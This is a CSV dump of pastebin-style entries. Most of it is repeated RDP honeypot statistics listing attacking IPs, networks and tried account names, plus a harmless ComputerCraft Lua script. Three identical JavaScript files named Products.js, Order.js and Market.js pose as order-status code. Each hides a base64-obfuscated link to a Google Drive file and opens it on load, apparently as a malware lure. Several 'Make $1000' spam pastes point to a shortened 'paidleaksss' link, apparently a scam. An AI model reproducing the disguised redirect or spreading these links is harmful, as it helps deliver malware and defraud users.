id,title,username,language,date,content
hxBTcFTk,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:18:40 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35271,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52914,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52914,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52914,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126495,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127764,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146964,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147057
  },
  ""client_build"": {
    ""Unknown"": 147057
  },
  ""client_name"": {
    ""Unknown"": 147057
  },
  ""ip_type"": {
    ""hosting & proxy"": 129057,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
i01ZPrFt,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:16:24 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35270,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52913,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52913,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52913,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126494,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127763,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146963,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147056
  },
  ""client_build"": {
    ""Unknown"": 147056
  },
  ""client_name"": {
    ""Unknown"": 147056
  },
  ""ip_type"": {
    ""hosting & proxy"": 129056,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
nzVYnLz5,Products.js,dentira,JavaScript,Friday 4th of April 2025 07:15:58 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/55872/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
gp5XAY6z,2025-04-03_stats.json,rdp_snitch,JSON,Friday 4th of April 2025 07:15:15 PM CDT,"{
  ""ip"": {
    ""156.146.57.110"": 35269,
    ""147.182.229.114"": 858,
    ""138.199.24.6"": 64821,
    ""138.199.24.30"": 8760,
    ""156.146.57.52"": 8826,
    ""150.95.89.149"": 8712,
    ""156.146.57.174"": 8817,
    ""146.190.105.191"": 1263,
    ""106.14.144.233"": 426,
    ""102.129.145.197"": 9174,
    ""147.185.132.19"": 9,
    ""185.147.124.165"": 9,
    ""68.183.178.139"": 6,
    ""205.210.31.206"": 9,
    ""80.94.95.90"": 6,
    ""93.174.95.106"": 3,
    ""157.245.104.150"": 3,
    ""88.214.25.123"": 6,
    ""92.255.85.92"": 9,
    ""194.165.16.164"": 6,
    ""1.95.183.16"": 3,
    ""58.218.199.219"": 12,
    ""147.185.132.40"": 9,
    ""165.154.138.85"": 3,
    ""45.79.73.129"": 12,
    ""170.187.203.104"": 3,
    ""198.235.24.108"": 9,
    ""84.17.46.178"": 12
  },
  ""asn"": {
    ""AS212238"": 52912,
    ""AS14061"": 2130,
    ""AS60068"": 73593,
    ""AS135161"": 8712,
    ""AS37963"": 426,
    ""AS174"": 9174,
    ""AS396982"": 36,
    ""AS49505"": 9,
    ""AS204428"": 6,
    ""AS202425"": 3,
    ""AS35042"": 6,
    ""AS207566"": 9,
    ""AS48721"": 6,
    ""AS55990"": 3,
    ""AS4134"": 12,
    ""AS135377"": 3,
    ""AS63949"": 15
  },
  ""isp"": {
    ""Datacamp Limited"": 52912,
    ""DigitalOcean, LLC"": 2130,
    ""DataCamp Limited"": 73593,
    ""GMO-Z.COM PTE. LTD."": 8712,
    ""Hangzhou Alibaba Advertising Co"": 426,
    ""Cogent Communications"": 9174,
    ""Google LLC"": 36,
    ""JSC Selectel"": 9,
    ""SS-Net"": 6,
    ""IP Volume inc"": 3,
    ""NOC EMAIL: noc@one-host.net"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A."": 6,
    ""DXTNET"": 3,
    ""Chinanet"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Akamai Technologies, Inc."": 15
  },
  ""org"": {
    ""Datacamp Limited"": 52912,
    ""DigitalOcean, LLC"": 2130,
    ""Cdn77 SGP"": 73581,
    ""Zcom Thai"": 8712,
    ""Aliyun Computing Co., LTD"": 426,
    ""Netutils"": 9174,
    ""Palo Alto Networks, Inc"": 36,
    ""Almira LLC"": 9,
    ""Unmanaged LTD"": 6,
    ""IP Volume inc"": 3,
    ""ThinkTech Technology Industrial CO. Limited"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Flyservers S.A"": 6,
    ""Beijing Teletron Telecom Engineering Co., Ltd."": 3,
    ""Chinanet JS"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Linode"": 15,
    ""Cdn77 AMS"": 12
  },
  ""regionName"": {
    ""North West"": 126493,
    ""California"": 10080,
    ""Tokyo"": 8712,
    ""South West"": 1269,
    ""Shanghai"": 426,
    ""Moscow"": 18,
    ""Sofia-Capital"": 6,
    ""North Holland"": 15,
    ""Karnataka"": 3,
    ""Kowloon City"": 6,
    ""Kaunas"": 6,
    ""Guizhou"": 3,
    ""Jiangsu"": 12,
    ""Hesse"": 3,
    ""Georgia"": 3
  },
  ""country"": {
    ""Singapore"": 127762,
    ""United States"": 10083,
    ""Japan"": 8712,
    ""China"": 441,
    ""Russia"": 18,
    ""Bulgaria"": 6,
    ""The Netherlands"": 15,
    ""India"": 3,
    ""Hong Kong"": 6,
    ""Lithuania"": 6,
    ""Germany"": 3
  },
  ""account"": {
    ""hello"": 146962,
    ""zIUSdWivX"": 3,
    ""sfLjSJ"": 3,
    ""fZMizU"": 3,
    ""Domain"": 15,
    ""BDqFzlpWt"": 3,
    ""ScfRZI"": 3,
    ""khSizK"": 3,
    ""Administr"": 6,
    ""root"": 3,
    ""Test"": 15,
    ""lRmxRXldY"": 3,
    ""lWCxlE"": 3,
    ""SEuFSn"": 3,
    ""Administrator"": 3,
    ""ojqfilu4"": 12,
    ""beio"": 3,
    ""DUYvqdheA"": 3,
    ""nSlXHr"": 3,
    ""VYxYuJ"": 3
  },
  ""keyboard"": {
    ""Unknown"": 147055
  },
  ""client_build"": {
    ""Unknown"": 147055
  },
  ""client_name"": {
    ""Unknown"": 147055
  },
  ""ip_type"": {
    ""hosting & proxy"": 129055,
    ""hosting"": 8784,
    ""proxy"": 9198,
    ""Unknown"": 18
  }
}"
EPGEWq7y,Make $1000 15-MINUTES (BEGINNER) RV,lmoakdawadawd,JavaScript,Friday 4th of April 2025 07:06:04 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


ENMNXrZiUQ
"
4bCskTFf,Order.js,dentira,JavaScript,Friday 4th of April 2025 07:00:27 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/72816/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
wD1WiFnT,turret computer,Incomprehensible,Lua,Friday 4th of April 2025 06:52:46 PM CDT,"local monitor = peripheral.find(""monitor"")
local modem = peripheral.find(""modem"", rednet.open) -- doing it like this finds all modem peripherals and then opens rednet on them
local tPos
local pos
--- MAIN
monitor.clear()
monitor.setCursorPos(1,1)
monitor.setTextScale(0.5)
monitor.write(""Hello, ID: "" .. os.computerID()) --the id of the computer

function vec3ToString(vec3)
	local str = (""(x:"" .. math.floor(vec3.x+0.5) .. "", y:"" .. math.floor(vec3.y+0.5) .. "", z:"" .. math.floor(vec3.z+0.5) .. "")"")
	return str
end

function receivePosMessage()
	local id, message = rednet.receive(nil,0.5)
	if (message == nil) then return end
	tPos = message

end

function update()
	pos = ship.getWorldspacePosition()
	receivePosMessage()
	if(tPos == nil or pos == nil) then
		return
	end
	monitor.clear()
	monitor.setCursorPos(1,1)
	monitor.write(""Message from control: "" .. vec3ToString(tPos))
	monitor.setCursorPos(1,2)
	monitor.write(""Our position: "" .. vec3ToString(pos))
	print(pos)
end

while true do
	sleep(0.5)
	update()
end"
wAifubrU,EARN $900 INSTANTLY 2025 D0,lmoakdawadawd,JavaScript,Friday 4th of April 2025 06:50:07 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


KFq0gkXaP4
"
bBdeck2R,Market.js,dentira,JavaScript,Friday 4th of April 2025 06:45:05 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/08966/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
s182tCKD,Make $1000 15-MINUTES (BEGINNER) RQ,lmoakdawadawd,JavaScript,Friday 4th of April 2025 06:34:11 PM CDT," 
Pdf https://tinyurl.com/paidleaksss


dtVTn5iN3g
"
